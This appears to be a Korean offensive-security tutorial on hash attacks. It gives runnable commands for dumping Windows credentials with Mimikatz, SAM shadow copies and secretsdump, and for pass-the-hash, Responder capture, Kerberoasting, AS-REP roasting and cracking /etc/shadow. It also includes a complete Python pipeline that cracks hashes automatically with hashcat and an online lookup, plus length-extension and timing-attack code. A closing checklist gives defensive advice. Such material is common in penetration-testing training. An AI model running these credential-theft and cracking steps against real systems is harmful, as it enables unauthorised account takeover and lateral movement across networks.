# 해시 공격 기법 완전 정복

## 해시 함수 보안 속성

```
암호학적 해시 함수의 3가지 속성:

1. 역상 저항성 (Preimage Resistance)
   H(m) = h 가 주어졌을 때 m을 찾기 어려움
   → 비밀번호 해시 보호

2. 제2역상 저항성 (Second Preimage Resistance)  
   m이 주어졌을 때 H(m') = H(m)인 다른 m' 찾기 어려움
   → 문서 위변조 방지

3. 충돌 저항성 (Collision Resistance)
   H(m1) = H(m2)인 m1 ≠ m2 쌍 찾기 어려움
   → 디지털 서명 보호

파훼 현황:
  MD5: 충돌 저항성 파훼 (1996), 실용적 공격 가능 (2004)
  SHA-1: 충돌 저항성 파훼 (2017, SHAttered)
  SHA-256/SHA-3: 현재까지 안전
```

---

## 1. MD5 충돌 공격

### MD5 충돌 실습

```bash
# MD5 충돌 데모 파일 (fastcoll)
fastcoll -o collision1.bin collision2.bin

md5sum collision1.bin collision2.bin
# → 동일한 MD5 해시!

sha256sum collision1.bin collision2.bin
# → 다른 SHA-256 해시

# 실용적 활용: 악성코드 면역 AV (서명 기반)
# 정상 파일과 동일 MD5의 악성 파일 생성 가능
# → 파일 무결성 검증에 MD5 사용 금지!
```

### MD5 충돌을 이용한 공격

```python
# 길이 확장 공격 (Length Extension Attack)
# SHA-1, SHA-256, MD5의 취약점
# HMAC이 아닌 H(secret || message) 방식 MAC에 적용

import hashlib
import struct

def md5_pad(message: bytes) -> bytes:
    """MD5 패딩 추가"""
    length = len(message) * 8
    message += b'\x80'
    while len(message) % 64 != 56:
        message += b'\x00'
    message += struct.pack('<Q', length)
    return message

def md5_length_extension(
    original_hash: str,       # 알려진 H(secret || msg)
    original_msg: bytes,      # 알려진 msg
    secret_len: int,          # 추정되는 secret 길이
    additional_data: bytes    # 추가할 데이터
) -> tuple:
    """
    길이 확장 공격:
    H(secret || msg) → H(secret || msg || padding || additional)
    secret 없이 가능!
    """
    import hashpumpy
    
    # hashpumpy 라이브러리 사용
    new_hash, new_message = hashpumpy.hashpump(
        original_hash,
        original_msg,
        additional_data,
        secret_len
    )
    
    return new_hash, new_message

# 예시: 웹 앱에서 H(secret || username=admin)을 쿠키로 사용할 때
# 길이 확장으로 H(secret || username=admin || padding || &admin=true) 생성
```

---

## 2. 비밀번호 해시 공격

### 레인보우 테이블

```bash
# Ophcrack (Windows LM/NTLM)
ophcrack -g -d /usr/share/ophcrack/tables/ \
          -t XP_free_fast -f hash.txt

# RainbowCrack
rtgen md5 loweralpha-numeric 1 9 0 3800 33554432 0
rtsort *.rt
rcrack . -h 5f4dcc3b5aa765d61d8327deb882cf99

# rcracki_mt (멀티스레드)
rcracki_mt -f hash.txt *.rt

# 온라인 레인보우 테이블
# crackstation.net
# md5decrypt.net
# hashes.com
```

### bcrypt/Argon2 크래킹 한계

```bash
# bcrypt (느린 해시)
# $2y$12$... → cost factor 12
# 1초에 약 100번 시도 (GPU)
# RTX 3090: 약 184 H/s (매우 느림)

# 반면 MD5: RTX 3090에서 60,000 MH/s
# bcrypt 대비 327,000,000배 느림!

hashcat -m 3200 bcrypt.txt wordlist.txt
# -w 4 옵션으로 최대 성능

# Argon2 크래킹 (더 느림)
hashcat -m 13900 argon2.txt wordlist.txt

# 실용적 방어:
# bcrypt cost 12 이상 → 1초당 100회 이하
# 공격자 클라우드 비용: 10억번 시도 = $14,000+
```

### /etc/shadow 파일 공격

```bash
# Linux 비밀번호 해시 형식
# $1$ = MD5Crypt
# $2a$/2y$/2b$ = bcrypt
# $5$ = SHA-256Crypt
# $6$ = SHA-512Crypt (권장)
# $y$ = yescrypt

# 예시 shadow 항목
# user:$6$rounds=5000$randomsalt$HASH:18000:0:99999:7:::

# john 크래킹
john --wordlist=wordlist.txt /etc/shadow
john --format=sha512crypt hash.txt --wordlist=rockyou.txt

# hashcat
# SHA-512Crypt 모드 (1800)
hashcat -m 1800 shadow_hashes.txt wordlist.txt

# 언섀도우 (passwd + shadow 결합)
unshadow /etc/passwd /etc/shadow > combined.txt
john combined.txt
```

---

## 3. Windows 비밀번호 해시

### NTLM 해시 추출 및 크래킹

```bash
# SAM 데이터베이스에서 해시 추출
# 방법 1: Mimikatz (메모리에서)
mimikatz# sekurlsa::logonpasswords
mimikatz# lsadump::sam

# 방법 2: Volume Shadow Copy
vssadmin create shadow /for=c:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM .
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM .

# secretsdump.py (원격)
python3 secretsdump.py DOMAIN/USER:PASS@TARGET_IP

# NTLM 해시 크래킹
hashcat -m 1000 ntlm_hashes.txt wordlist.txt
john --format=nt ntlm_hashes.txt --wordlist=rockyou.txt

# Pass-the-Hash (비밀번호 없이 해시로 인증)
python3 smbclient.py -hashes ':NTLM_HASH' DOMAIN/USER@TARGET
```

### NTLMv2 캡처 및 크래킹

```bash
# Responder로 NTLMv2 캡처
sudo python3 Responder.py -I eth0 -wrf

# 캡처된 해시 크래킹
hashcat -m 5600 netntlmv2.txt rockyou.txt

# JohntheRipper
john netntlmv2.txt --wordlist=rockyou.txt --format=netntlmv2

# 크래킹 된 NTLMv2 예시
# Administrator::DOMAIN:CHALLENGE:RESPONSE:...
```

---

## 4. Kerberos 해시 공격

### Kerberoasting

```bash
# 서비스 티켓 요청 (SPN이 있는 서비스 계정)
# Impacket
python3 GetUserSPNs.py DOMAIN/USER:PASS@DC_IP -request

# PowerShell (Rubeus)
.\Rubeus.exe kerberoast /outfile:hashes.txt

# 캡처된 TGS 해시 크래킹
# $krb5tgs$23$... (RC4-HMAC) → mode 13100
hashcat -m 13100 kerberoast_hashes.txt wordlist.txt

# $krb5tgs$18$... (AES256) → mode 19700
hashcat -m 19700 kerberoast_aes.txt wordlist.txt
```

### AS-REP Roasting

```bash
# Kerberos 사전 인증이 비활성화된 계정 대상
python3 GetNPUsers.py DOMAIN/ -usersfile users.txt \
    -format hashcat -outputfile asrep_hashes.txt \
    -dc-ip DC_IP

# 크래킹
# $krb5asrep$23$... → mode 18200
hashcat -m 18200 asrep_hashes.txt wordlist.txt
```

---

## 5. 해시 공격 자동화

```python
#!/usr/bin/env python3
"""해시 크래킹 자동화 파이프라인"""

import hashlib
import subprocess
import json
from pathlib import Path

class HashCracker:
    def __init__(self, wordlist: str = '/usr/share/wordlists/rockyou.txt'):
        self.wordlist = wordlist
        self.rules = [
            '/usr/share/hashcat/rules/best64.rule',
            '/usr/share/hashcat/rules/d3ad0ne.rule'
        ]
    
    def identify(self, hash_str: str) -> tuple:
        """해시 유형 및 hashcat 모드 반환"""
        patterns = {
            (r'^[a-f0-9]{32}$', None): [('MD5', 0), ('NTLM', 1000)],
            (r'^[a-f0-9]{40}$', None): [('SHA1', 100)],
            (r'^[a-f0-9]{64}$', None): [('SHA256', 1400)],
            (r'^\$2[ayb]\$.+', None): [('bcrypt', 3200)],
            (r'^\$6\$.+', None): [('sha512crypt', 1800)],
            (r'^\$1\$.+', None): [('md5crypt', 500)],
            (r'^\$krb5tgs\$23\$.+', None): [('Kerberoast_RC4', 13100)],
            (r'^\$krb5asrep\$23\$.+', None): [('AS-REP', 18200)],
        }
        
        import re
        for (pattern, _), types in patterns.items():
            if re.match(pattern, hash_str, re.IGNORECASE):
                return types
        
        return [('Unknown', -1)]
    
    def crack_online(self, hash_str: str) -> str:
        """온라인 DB에서 해시 검색"""
        import urllib.request
        
        # CrackStation API (MD5/SHA1/SHA256)
        url = f"https://crackstation.net/crack/{hash_str}"
        try:
            with urllib.request.urlopen(url, timeout=5) as r:
                data = json.loads(r.read())
                if data.get('result'):
                    return data['result']
        except:
            pass
        
        return None
    
    def crack_hashcat(self, hash_str: str, mode: int, 
                      attack_type: str = 'dict') -> str:
        """hashcat으로 크래킹"""
        
        hash_file = Path('/tmp/crack_hash.txt')
        hash_file.write_text(hash_str)
        
        cmd = ['hashcat', '-m', str(mode), str(hash_file)]
        
        if attack_type == 'dict':
            cmd += [self.wordlist]
        elif attack_type == 'rules':
            cmd += [self.wordlist]
            for rule in self.rules:
                cmd += ['-r', rule]
        elif attack_type == 'brute':
            cmd += ['-a', '3', '?a?a?a?a?a?a?a?a']  # 8자리
        
        cmd += ['--quiet', '--potfile-disable']
        
        try:
            result = subprocess.run(cmd, capture_output=True, 
                                   text=True, timeout=300)
            
            # 결과 파싱
            if ':' in result.stdout:
                return result.stdout.split(':')[-1].strip()
        except subprocess.TimeoutExpired:
            print(f"[-] 타임아웃 (5분)")
        
        return None
    
    def crack(self, hash_str: str) -> dict:
        """자동 크래킹 파이프라인"""
        result = {'hash': hash_str, 'type': None, 'password': None}
        
        # 1단계: 유형 식별
        types = self.identify(hash_str)
        result['type'] = types[0][0] if types else 'Unknown'
        print(f"[*] 해시 유형: {result['type']}")
        
        # 2단계: 온라인 DB 검색 (빠름)
        print("[*] 온라인 DB 검색...")
        online_result = self.crack_online(hash_str)
        if online_result:
            result['password'] = online_result
            result['method'] = 'online'
            return result
        
        # 3단계: hashcat 딕셔너리
        for name, mode in types:
            if mode == -1:
                continue
            
            print(f"[*] hashcat 딕셔너리 공격 (mode {mode})...")
            password = self.crack_hashcat(hash_str, mode, 'dict')
            if password:
                result['password'] = password
                result['method'] = f'hashcat_dict_{name}'
                return result
            
            # 4단계: 규칙 기반
            print(f"[*] hashcat 규칙 공격...")
            password = self.crack_hashcat(hash_str, mode, 'rules')
            if password:
                result['password'] = password
                result['method'] = f'hashcat_rules_{name}'
                return result
        
        print("[-] 크랙 실패")
        return result

if __name__ == "__main__":
    cracker = HashCracker()
    
    test_hashes = [
        "5f4dcc3b5aa765d61d8327deb882cf99",  # MD5("password")
        "5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8",  # SHA1
        "aad3b435b51404eeaad3b435b51404ee:31d6...",  # NTLM
    ]
    
    for hash_str in test_hashes:
        result = cracker.crack(hash_str)
        if result['password']:
            print(f"[+] 크랙 성공: {result['hash']} → {result['password']}")
        print()
```

---

## 6. HMAC 및 MAC 공격

### 타이밍 공격

```python
import hmac
import time
import statistics

def vulnerable_compare(a: str, b: str) -> bool:
    """취약한 문자열 비교 (타이밍 공격에 취약)"""
    if len(a) != len(b):
        return False
    for x, y in zip(a, b):
        if x != y:
            return False  # 첫 불일치에서 즉시 반환 → 시간 차이 발생
    return True

def timing_attack_demo(target_mac: str):
    """타이밍 공격으로 HMAC 바이트 단위 복원"""
    
    charset = '0123456789abcdef'
    recovered = ""
    
    for position in range(len(target_mac)):
        times = {}
        
        for char in charset:
            guess = recovered + char + "0" * (len(target_mac) - len(recovered) - 1)
            
            # 여러 번 시도해서 평균 시간 측정
            measurements = []
            for _ in range(100):
                start = time.perf_counter_ns()
                vulnerable_compare(guess, target_mac)
                end = time.perf_counter_ns()
                measurements.append(end - start)
            
            times[char] = statistics.median(measurements)
        
        # 가장 오래 걸린 문자 = 일치하는 문자
        best_char = max(times, key=times.get)
        recovered += best_char
        print(f"[*] 위치 {position}: {best_char} (복원: {recovered})")
    
    return recovered

# 안전한 비교 (상수 시간)
def safe_compare(a: str, b: str) -> bool:
    return hmac.compare_digest(a.encode(), b.encode())
```

---

## 7. 해시 보안 체크리스트

```
비밀번호 저장:
  □ bcrypt, Argon2id, scrypt 사용 (느린 해시)
  □ MD5, SHA-1, SHA-256 단독 사용 금지
  □ cost factor 주기적 증가 (하드웨어 발전에 따라)
  □ 솔트 자동 생성 (라이브러리가 처리)

MAC/서명:
  □ HMAC 사용 (단순 H(key || msg) 금지)
  □ hmac.compare_digest() 로 상수 시간 비교
  □ HMAC-SHA256 이상 사용

파일 무결성:
  □ SHA-256 이상 사용
  □ MD5/SHA-1 단독 사용 금지
  □ HMAC으로 키 기반 인증 포함 고려

인증서/서명:
  □ SHA-256 서명 알고리즘
  □ SHA-1 서명 인증서 거부
```
